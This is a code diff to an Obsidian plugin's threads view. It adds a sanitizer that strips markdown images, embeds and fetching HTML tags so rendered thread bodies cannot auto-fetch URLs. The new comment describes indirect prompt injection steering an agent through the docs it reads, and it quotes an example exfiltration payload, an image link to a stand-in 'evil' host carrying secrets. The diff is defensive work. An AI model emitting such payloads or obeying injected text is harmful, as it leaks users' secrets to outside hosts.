@@ -51,6 +51,29 @@ function isDrifted(thread: Thread, docText: string | null): boolean {
   return !docText.includes(anchored);
 }
 
+/**
+ * Thread bodies are agent- or user-authored, and the agent can be steered by
+ * any doc it reads (indirect prompt injection). Rendering them as full markdown
+ * would auto-fetch image/embed URLs on render — a silent exfiltration channel
+ * (e.g. `![](https://evil/?d=secrets)`). Neutralize the network-fetching
+ * constructs before rendering; formatting (bold, lists, code, headings, links)
+ * still renders, and links require an explicit click. This restores the
+ * no-auto-fetch property the previous plain-text rendering relied on.
+ */
+function stripAutoFetch(md: string): string {
+  return md
+    // Markdown image -> its alt text (no <img>, no fetch).
+    .replace(/!\[([^\]]*)\]\([^)]*\)/g, "$1")
+    // Obsidian embed ![[...]] -> a plain wikilink [[...]] (link, not an embed).
+    .replace(/!(?=\[\[)/g, "")
+    // Raw HTML tags that fetch/execute on render.
+    .replace(
+      /<\s*(img|iframe|embed|object|video|audio|source|link|script)\b[^>]*>/gi,
+      "",
+    )
+    .replace(/<\/\s*(iframe|object|video|audio|script)\s*>/gi, "");
+}
+
 export class ThreadsView extends ItemView {
   private currentDocPath: string | null = null;
   private currentFile: TFile | null = null;
@@ -357,7 +380,7 @@ export class ThreadsView extends ItemView {
       body.style.fontSize = "0.9em";
       void MarkdownRenderer.render(
         this.app,
-        msg.body,
+        stripAutoFetch(msg.body),
         body,
         this.currentDocPath ?? "",
         this,
@@ -499,7 +522,17 @@ export class ThreadsView extends ItemView {
       });
     });
 
-    // Preview of the selected variant's text.
+    // The selected option's trade-off blurb (its "why"), above the sample.
+    const description = variants[selected].description;
+    if (description) {
+      const desc = wrap.createDiv();
+      desc.setText(description);
+      desc.style.fontSize = "0.85em";
+      desc.style.opacity = "0.8";
+      desc.style.marginBottom = "0.4em";
+    }
+
+    // Preview: a sample of the result for the selected option.
     const preview = wrap.createDiv();
     preview.setText(
       variants[selected].new_md.length > 240
